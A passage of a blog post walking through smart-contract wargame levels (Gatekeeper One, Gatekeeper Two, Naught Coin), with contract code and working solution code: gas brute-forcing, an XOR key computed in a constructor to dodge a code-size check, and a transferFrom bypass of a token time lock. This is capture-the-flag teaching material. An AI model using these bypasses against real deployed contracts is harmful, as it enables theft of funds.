+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">modifier</span> <span style="color:#a6e22e">gateThree</span>(<span style="color:#a6e22e">bytes8</span> <span style="color:#a6e22e">_gateKey</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">require</span>(<span style="color:#a6e22e">uint32</span>(<span style="color:#a6e22e">uint64</span>(<span style="color:#a6e22e">_gateKey</span>)) <span style="color:#f92672">==</span> <span style="color:#a6e22e">uint16</span>(<span style="color:#a6e22e">uint64</span>(<span style="color:#a6e22e">_gateKey</span>)), <span style="color:#e6db74">&#34;GatekeeperOne: invalid gateThree part one&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">require</span>(<span style="color:#a6e22e">uint32</span>(<span style="color:#a6e22e">uint64</span>(<span style="color:#a6e22e">_gateKey</span>)) <span style="color:#f92672">!=</span> <span style="color:#a6e22e">uint64</span>(<span style="color:#a6e22e">_gateKey</span>), <span style="color:#e6db74">&#34;GatekeeperOne: invalid gateThree part two&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">require</span>(<span style="color:#a6e22e">uint32</span>(<span style="color:#a6e22e">uint64</span>(<span style="color:#a6e22e">_gateKey</span>)) <span style="color:#f92672">==</span> <span style="color:#a6e22e">uint16</span>(<span style="color:#a6e22e">uint160</span>(<span style="color:#a6e22e">tx</span>.<span style="color:#a6e22e">origin</span>)), <span style="color:#e6db74">&#34;GatekeeperOne: invalid gateThree part three&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">_</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The first requirement requires that the 64 uint conversion to 16 uint of the _gateKey parameter is equal to the 64 uint conversion to 32 uint of the same _gateKey parameter.</p>
+<p>The second requirement requires that the 64 uint of the _gateKey parameter is not equal to the 64 uint conversion to 32 uint of the same _gateKey parameter.</p>
+<p>The third requirement requires that the 160 uint conversion to 16 uint of the wallet address is equal to the 64 uint conversion to 32 uint of the _gateKey parameter.</p>
+<p>The enter() method sets the entrant to the wallet address if the modifiers are satisfied:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">enter</span>(<span style="color:#a6e22e">bytes8</span> <span style="color:#a6e22e">_gateKey</span>) <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">gateOne</span> <span style="color:#a6e22e">gateTwo</span> <span style="color:#a6e22e">gateThree</span>(<span style="color:#a6e22e">_gateKey</span>) <span style="color:#a6e22e">returns</span> (<span style="color:#a6e22e">bool</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">entrant</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">tx</span>.<span style="color:#a6e22e">origin</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="demystifying-solution-12">
+  Demystifying Solution:
+  <a href="#demystifying-solution-12" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<p>The first modifier can be satisfied by simply calling the instance from a contract.</p>
+<p>The third modifier can be satisfied by calculating the last requirement of the modifier:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">uint32</span>(<span style="color:#a6e22e">uint64</span>(<span style="color:#a6e22e">_gateKey</span>)) <span style="color:#f92672">==</span> <span style="color:#a6e22e">uint16</span>(<span style="color:#a6e22e">tx</span>.<span style="color:#a6e22e">origin</span>)
+</span></span></code></pre></div><p>This satisfies the second requirement too, and we can satisfy the first requirement by changing the bits from 16 to 32 equal to 0.</p>
+<p>And the second modifier can be satisfied by brute-forcing the amount of gas required to validate the requirement of the gas left modulo 8191 is equal to 0:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">for</span> (<span style="color:#a6e22e">uint256</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">8191</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;gas&#34;</span>, <span style="color:#a6e22e">i</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">Exploit</span>.<span style="color:#a6e22e">enter</span>(<span style="color:#a6e22e">address</span>(<span style="color:#a6e22e">instance</span>), <span style="color:#a6e22e">i</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">catch</span> {}
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>And the gas required is 256.</p>
+<p>You can check the entrant state variable equal to your address by:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">await</span> <span style="color:#a6e22e">contract</span>.<span style="color:#a6e22e">entrant</span>()
+</span></span></code></pre></div><p>And now you can submit your instance!</p>
+<h2 id="level-14-gatekeeper-two">
+  LEVEL 14: Gatekeeper Two
+  <a href="#level-14-gatekeeper-two" class="h-anchor" aria-hidden="true">#</a>
+</h2>
+<h3 id="objective-13">
+  Objective:
+  <a href="#objective-13" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<ul>
+<li>Register as an entrant.</li>
+</ul>
+<h3 id="demystifying-contract-12">
+  Demystifying Contract:
+  <a href="#demystifying-contract-12" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<p>The contract is constructed based on a function and different modifiers, The first line defines the entrant address variable:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">address</span> <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">entrant</span>;
+</span></span></code></pre></div><p>The gateOne modifier serves the purpose of making sure that the wallet address isn&rsquo;t equal to the caller address or the caller is only a contract:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">modifier</span> <span style="color:#a6e22e">gateOne</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">require</span>(<span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">sender</span> <span style="color:#f92672">!=</span> <span style="color:#a6e22e">tx</span>.<span style="color:#a6e22e">origin</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">_</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The gateTwo modifier requires the caller contract code size equal to 0:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">modifier</span> <span style="color:#a6e22e">gateTwo</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">uint</span> <span style="color:#a6e22e">x</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">assembly</span> { <span style="color:#a6e22e">x</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">extcodesize</span>(<span style="color:#a6e22e">caller</span>()) }
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">require</span>(<span style="color:#a6e22e">x</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">_</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The gateThree modifier requires an XOR bitwise operation to be staisfied:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">modifier</span> <span style="color:#a6e22e">gateThree</span>(<span style="color:#a6e22e">bytes8</span> <span style="color:#a6e22e">_gateKey</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">require</span>(<span style="color:#a6e22e">uint64</span>(<span style="color:#a6e22e">bytes8</span>(<span style="color:#a6e22e">keccak256</span>(<span style="color:#a6e22e">abi</span>.<span style="color:#a6e22e">encodePacked</span>(<span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">sender</span>)))) <span style="color:#f92672">^</span> <span style="color:#a6e22e">uint64</span>(<span style="color:#a6e22e">_gateKey</span>) <span style="color:#f92672">==</span> <span style="color:#a6e22e">type</span>(<span style="color:#a6e22e">uint64</span>).<span style="color:#a6e22e">max</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">_</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The enter() method sets the entrant to the wallet address if the modifiers are satisfied:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">enter</span>(<span style="color:#a6e22e">bytes8</span> <span style="color:#a6e22e">_gateKey</span>) <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">gateOne</span> <span style="color:#a6e22e">gateTwo</span> <span style="color:#a6e22e">gateThree</span>(<span style="color:#a6e22e">_gateKey</span>) <span style="color:#a6e22e">returns</span> (<span style="color:#a6e22e">bool</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">entrant</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">tx</span>.<span style="color:#a6e22e">origin</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="demystifying-solution-13">
+  Demystifying Solution:
+  <a href="#demystifying-solution-13" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<p>The first modifier can be satisfied by simply calling the instance from a contract.</p>
+<p>The second modifier can be satisfied by calling the instance from the caller contract constructor and therefore validating the caller contract code size equal to 0.</p>
+<p>The third modifier can be satisfied by inverting the XOR bitwise operation:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">bytes8</span> <span style="color:#a6e22e">_gateKey</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">bytes8</span>(<span style="color:#a6e22e">keccak256</span>(<span style="color:#a6e22e">abi</span>.<span style="color:#a6e22e">encodePacked</span>(<span style="color:#a6e22e">address</span>(<span style="color:#66d9ef">this</span>)))) <span style="color:#f92672">^</span> <span style="color:#ae81ff">0xFFFFFFFFFFFFFFFF</span>;
+</span></span></code></pre></div><p>The <code>type(uint64).max</code> is represented as <code>uint64(0) - 1</code> and converted to <code>0xFFFFFFFFFFFFFFFF</code>.</p>
+<p>The solution contract is constructed based on a constructor, The first two lines are defining two variables:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">IGatekeeperTwo</span> <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">instance</span>;
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">bytes8</span> <span style="color:#a6e22e">_gateKey</span>;
+</span></span></code></pre></div><p>The first line is the instance for the GatekeeperTwo contract interface, The second line is the _gateKey variable that assigns the inverted XOR bitwise operation.</p>
+<p>The constructor initialize the instance address for the GatekeeperTwo contract interface:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">constructor</span>(<span style="color:#a6e22e">address</span> <span style="color:#a6e22e">instanceAddress</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">instance</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">IGatekeeperTwo</span>(<span style="color:#a6e22e">instanceAddress</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">_gateKey</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">bytes8</span>(<span style="color:#a6e22e">keccak256</span>(<span style="color:#a6e22e">abi</span>.<span style="color:#a6e22e">encodePacked</span>(<span style="color:#a6e22e">address</span>(<span style="color:#66d9ef">this</span>)))) <span style="color:#f92672">^</span> <span style="color:#ae81ff">0xFFFFFFFFFFFFFFFF</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">instance</span>.<span style="color:#a6e22e">enter</span>(<span style="color:#a6e22e">_gateKey</span>);        
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>And calls the enter() instance method with the _gateKey variable in the constructor which satisfies the second modifier.</p>
+<p>You can check the entrant state variable equal to your address by:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">await</span> <span style="color:#a6e22e">contract</span>.<span style="color:#a6e22e">entrant</span>()
+</span></span></code></pre></div><p>And now you can submit your instance!</p>
+<h2 id="level-15-naught-coin">
+  LEVEL 15: Naught Coin
+  <a href="#level-15-naught-coin" class="h-anchor" aria-hidden="true">#</a>
+</h2>
+<h3 id="objective-14">
+  Objective:
+  <a href="#objective-14" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<ul>
+<li>Get your token balance to 0.</li>
+</ul>
+<h3 id="demystifying-contract-13">
+  Demystifying Contract:
+  <a href="#demystifying-contract-13" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<p>The NaughtCoin contract is inheriting the ERC20 which validates it as ERC20 token:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span> <span style="color:#a6e22e">contract</span> <span style="color:#a6e22e">NaughtCoin</span> <span style="color:#a6e22e">is</span> <span style="color:#a6e22e">ERC20</span>
+</span></span></code></pre></div><p>The contract is constructed based on a constructor and a function, The first three lines are defining three variables:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">uint</span> <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">timeLock</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">block</span>.<span style="color:#a6e22e">timestamp</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">10</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">365</span> <span style="color:#a6e22e">days</span>;
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">uint256</span> <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">INITIAL_SUPPLY</span>;
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">address</span> <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">player</span>;
+</span></span></code></pre></div><p>The first line is the time lock variable, The second line is the initial supply variable and the third line is the player address.</p>
+<p>The constructor initialize the supply and the player through the inherited ERC20 contract:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">constructor</span>(<span style="color:#a6e22e">address</span> <span style="color:#a6e22e">_player</span>) <span style="color:#a6e22e">ERC20</span>(<span style="color:#e6db74">&#39;NaughtCoin&#39;</span>, <span style="color:#e6db74">&#39;0x0&#39;</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">player</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">_player</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">INITIAL_SUPPLY</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1000000</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">10</span><span style="color:#f92672">**</span><span style="color:#a6e22e">uint256</span>(<span style="color:#a6e22e">decimals</span>()));
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// _totalSupply = INITIAL_SUPPLY;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// _balances[player] = INITIAL_SUPPLY;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">_mint</span>(<span style="color:#a6e22e">player</span>, <span style="color:#a6e22e">INITIAL_SUPPLY</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">emit</span> <span style="color:#a6e22e">Transfer</span>(<span style="color:#a6e22e">address</span>(<span style="color:#ae81ff">0</span>), <span style="color:#a6e22e">player</span>, <span style="color:#a6e22e">INITIAL_SUPPLY</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The transfer() method allows address&rsquo;s to transfer value to each other:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">transfer</span>(<span style="color:#a6e22e">address</span> <span style="color:#a6e22e">_to</span>, <span style="color:#a6e22e">uint256</span> <span style="color:#a6e22e">_value</span>) <span style="color:#a6e22e">override</span> <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">lockTokens</span> <span style="color:#a6e22e">returns</span>(<span style="color:#a6e22e">bool</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">super</span>.<span style="color:#a6e22e">transfer</span>(<span style="color:#a6e22e">_to</span>, <span style="color:#a6e22e">_value</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The modifier serves the purpose of preventing the initial owner from transferring tokens until the timelock has passedr:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">modifier</span> <span style="color:#a6e22e">lockTokens</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">sender</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">player</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">require</span>(<span style="color:#a6e22e">block</span>.<span style="color:#a6e22e">timestamp</span> <span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">timeLock</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">_</span>;
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">_</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>} 
+</span></span></code></pre></div><h3 id="demystifying-solution-14">
+  Demystifying Solution:
+  <a href="#demystifying-solution-14" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<p>Due to the NaughtCoin contract inheriting the ERC20 contract we can interact with other methods to move the funds such the transferFrom() method.</p>
+<p>But before moving the funds we need to validate the amount to move:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">value</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">contract</span>.<span style="color:#a6e22e">INITIAL_SUPPLY</span>()
+</span></span></code></pre></div><p>And then approve and confirm the amount:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">await</span> <span style="color:#a6e22e">contract</span>.<span style="color:#a6e22e">approve</span>(<span style="color:#a6e22e">player</span>, <span style="color:#a6e22e">value</span>);
+</span></span></code></pre></div><p>And then transfer it by:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">contract</span>.<span style="color:#a6e22e">transferFrom</span>(<span style="color:#a6e22e">player</span>, <span style="color:#e6db74">&#34;instanceAddress&#34;</span>, <span style="color:#a6e22e">value</span>);
+</span></span></code></pre></div><p>And now you can submit your instance!</p>
+
+    </div>
+    
+      
+        <div class="pagination">
+          <div class="pagination__title">
+            <span class="pagination__title-h"
+              >Read other posts</span
+            >
+            <hr />
+          </div>
+          <div class="pagination__buttons">
+            
+              <span class="button previous">
+                <a href="/post/demystifying-solidity-wargames-smarxs-capture-the-ether/">
+                  <span class="button__icon">←</span>
+                  <span class="button__text">Demystifying Solidity Wargames: Smarx&#39;s capture the ether</span>
+                </a>
+              </span>
+            
+            
+              <span class="button next">
+                <a href="/post/the-grinch-networks-is-down/">
+                  <span class="button__text">THE GRINCH NETWORKS IS DOWN!</span>
+                  <span class="button__icon">→</span>
+                </a>
+              </span>
+            
+          </div>
+        </div>
+      
+    
+
+    
+      
+        
+
+      
+    
+  </article>
+
+      </div>
+
+      
+        <footer class="footer">
+  <div class="footer__inner">
+    
+      <a
+  href="/"
+  class="logo"
+  style="text-decoration: none;"
+>
+  
+
+    <span class="logo__text"
+      >AHZ</span
+    >
+
+  
+</a>
+
+      <div class="copyright">
+        <span>© 2023. All rights reserved.</span>
+
+      </div>
+    
+  </div>
+</footer>
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+      
+    </div>
+
+    
+  </body>
+</html>
